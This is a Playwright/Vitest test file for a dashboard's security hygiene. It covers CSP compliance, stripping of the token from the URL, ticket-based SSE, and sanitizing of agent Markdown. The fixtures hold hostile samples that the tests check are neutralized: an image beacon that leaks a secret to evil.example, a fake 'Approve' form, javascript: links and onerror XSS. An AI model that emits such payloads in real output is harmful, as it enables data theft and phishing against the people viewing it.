// SC hygiene in a real browser: the built dashboard under the server's CSP loads every route
// without CSP violations or page errors; ?token= is stripped from the address bar; the live feed
// opens via a single-use ticket (no token in the EventSource URL); agent Markdown can't render
// images, forms or javascript: links. Needs web/dist (npm --prefix web run build).
import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { existsSync, mkdtempSync, readFileSync } from 'node:fs';
import { homedir, tmpdir } from 'node:os';
import { join } from 'node:path';
import { chromium, type Browser } from 'playwright-core';
import { startAlfred, type Alfred } from '../../src/main.js';
import { openChatStore } from '../../src/chat/store.js';

const EXE = join(homedir(), '.cache/ms-playwright/chromium_headless_shell-1228/chrome-linux/headless_shell');
const HAVE = existsSync(EXE) && existsSync('web/dist/index.html');
const TOKEN = 'sc-web-token-1234';

const idle = {
  async chat(req: any) {
    await new Promise((r) => { const t = setTimeout(r, 60_000); req.signal?.addEventListener('abort', () => { clearTimeout(t); r(null); }); });
    return { content: '', toolCalls: [], usage: { promptTokens: 1, completionTokens: 1 } };
  },
};

describe.skipIf(!HAVE)('dashboard under CSP (Chromium)', () => {
  let alfred: Alfred;
  let browser: Browser;
  let threadId = '';
  let goalId = '';

  beforeAll(async () => {
    const base = mkdtempSync(join(tmpdir(), 'sc-web-'));
    alfred = await startAlfred({
      dbPath: join(base, 'a.db'), mirrorDir: join(base, 'vault'), workRoot: join(base, 'work'), personasDir: 'personas',
      port: 0, host: '127.0.0.1', pollMs: 25, deck: null, token: TOKEN, env: { ALFRED_NOTIFY_DESKTOP: '0' }, llm: idle as any,
      gitRoot: join(base, 'git'),
    } as any);
    const cs = openChatStore(alfred.store);
    const th = cs.createThread('csp');
    threadId = th.id;
    cs.addMessage({
      threadId, role: 'assistant',
      content: 'hello **world**\n\n![x](https://evil.example/leak?secret=1)\n\n<form action="https://evil.example"><button>Approve</button></form>\n\n' +
        '[bad](javascript:alert(1)) [ext](https://example.com/) [route](#/goals) <img src=x onerror=alert(1)> <svg><circle r=1 /></svg>\n\n- [ ] todo\n',
    });
    const res = await fetch(`${alfred.url}/api/v1/goals`, { method: 'POST', headers: { authorization: `Bearer ${TOKEN}`, 'content-type': 'application/json' }, body: JSON.stringify({ title: 'csp goal' }) });
    goalId = (await res.json()).goal.id;
    browser = await chromium.launch({
      executablePath: EXE, args: ['--disable-gpu'],
      env: { ...process.env, __EGL_VENDOR_LIBRARY_FILENAMES: '/usr/share/glvnd/egl_vendor.d/50_mesa.json', VK_ICD_FILENAMES: '/usr/share/vulkan/icd.d/lvp_icd.json' },
    });
  }, 60_000);

  afterAll(async () => {
    await browser?.close();
    await alfred?.stop();
  });

  it('loads every route with no CSP violations or page errors; strips ?token=; SSE uses a ticket', async () => {
    const page = await browser.newPage({ viewport: { width: 1400, height: 900 } });
    const problems: string[] = [];
    const sseUrls: string[] = [];
    page.on('pageerror', (e) => problems.push(`pageerror: ${e.message}`));
    page.on('console', (m) => { if (/Content Security Policy|Refused to/i.test(m.text())) problems.push(`console: ${m.text()}`); });
    page.on('request', (r) => { if (r.url().includes('/api/events?')) sseUrls.push(r.url()); });
    await page.exposeFunction('__cspViolation', (s: string) => problems.push(`csp: ${s}`));
    await page.addInitScript(() => {
      document.addEventListener('securitypolicyviolation', (e: any) => (window as any).__cspViolation(`${e.violatedDirective} ${e.blockedURI}`));
    });

    await page.goto(`${alfred.url}/?token=${TOKEN}#/goals`);
    await page.waitForFunction(() => !location.search.includes('token'));
    expect(new URL(page.url()).search).toBe('');
    expect(new URL(page.url()).hash).toBe('#/goals');

    const routes = ['/', '/inbox', '/board', '/goals', `/goal/${goalId}`, `/goal/${goalId}/transcript`, `/goal/${goalId}/files`, '/chat', `/chat/${threadId}`,
      '/automations', '/deck', ...['overview', 'services', 'qwen', 'logs', 'config', 'models', 'personas', 'nodes', 'repos', 'builds', 'connectors', 'contacts'].map((t) => `/system/${t}`)];
    for (const r of routes) {
      await page.evaluate((h) => { location.hash = h; }, `#${r}`);
      await page.waitForTimeout(250);
    }
    await page.evaluate((h) => { location.hash = h; }, `#/chat/${threadId}`);
    await page.waitForSelector('.chat-md');
    const md = await page.$$eval('.chat-md', (els) => els.map((e) => e.innerHTML).join('\n'));
    expect(md).toContain('<strong>world</strong>');
    expect(md).not.toMatch(/<img|<form|<button|<svg|onerror|javascript:/i);
    expect(md).not.toContain('evil.example/leak');
    expect(md).toContain('href="https://example.com/"');
    expect(md).toMatch(/href="https:\/\/example\.com\/"[^>]*target="_blank"|target="_blank"[^>]*href="https:\/\/example\.com\/"/);
    expect(md).toContain('rel="noopener noreferrer"');
    expect(md).toContain('href="#/goals"');
    expect(md).toMatch(/<input[^>]*type="checkbox"/);

    expect(problems).toEqual([]);
    expect(sseUrls.length).toBeGreaterThan(0);
    for (const u of sseUrls) {
      expect(u).toContain('ticket=');
      expect(u).not.toContain('token=');
    }
    await page.close();
  }, 90_000);

  it('the sanitizer module strips dangerous markup against a real DOM', async () => {
    const page = await browser.newPage();
    await page.setContent('<!doctype html><html><body></body></html>');
    await page.addScriptTag({ path: 'web/node_modules/dompurify/dist/purify.min.js' });
    const src = readFileSync('web/src/lib/sanitize.js', 'utf8');
    await page.addScriptTag({ type: 'module', content: `${src}\nwindow.__san = (h) => sanitizeMarkdownHtml(window.DOMPurify, h);` });
    await page.waitForFunction(() => typeof (window as any).__san === 'function');
    const out: string = await page.evaluate(() => (window as any).__san(
      '<p><img src="https://evil/x?s=1"><form action="https://evil"><input name=a><button>Approve</button></form>' +
      '<a href="javascript:alert(1)">j</a><a href="data:text/html,x">d</a><a href="/api/x">rel</a><a href="https://ok/">ok</a><a href="mailto:q@x">m</a>' +
      '<a href="#/goals">g</a><span style="position:fixed" onclick="x()">s</span><iframe src="https://evil"></iframe><svg><a href="x"></a></svg>' +
      '<input type="checkbox" checked name="n" onclick="x()"></p>'));
    expect(out).not.toMatch(/<img|<form|<button|<iframe|<svg|style=|onclick|javascript:|data:text|name=/i);
    expect(out).toContain('<a>j</a>');
    expect(out).toContain('<a>rel</a>');
    expect(out).toContain('href="https://ok/"');
    expect(out).toContain('rel="noopener noreferrer"');
    expect(out).toContain('href="mailto:q@x"');
    expect(out).toContain('<a href="#/goals">g</a>');
    expect(out).toMatch(/<input type="checkbox" checked="" disabled="">/);
    await page.close();
  }, 30_000);
});
